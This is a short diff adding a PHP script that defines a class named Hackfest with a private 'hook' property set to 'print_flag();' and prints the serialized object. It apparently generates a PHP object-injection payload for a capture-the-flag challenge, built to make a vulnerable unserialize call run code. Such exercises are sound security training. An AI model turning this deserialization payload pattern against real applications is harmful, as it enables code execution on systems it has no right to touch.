@@ -1,0 +1,8 @@
+<?php
+class Hackfest
+{
+   private $hook = "print_flag();";
+
+}
+print (serialize(new Hackfest));
+?>
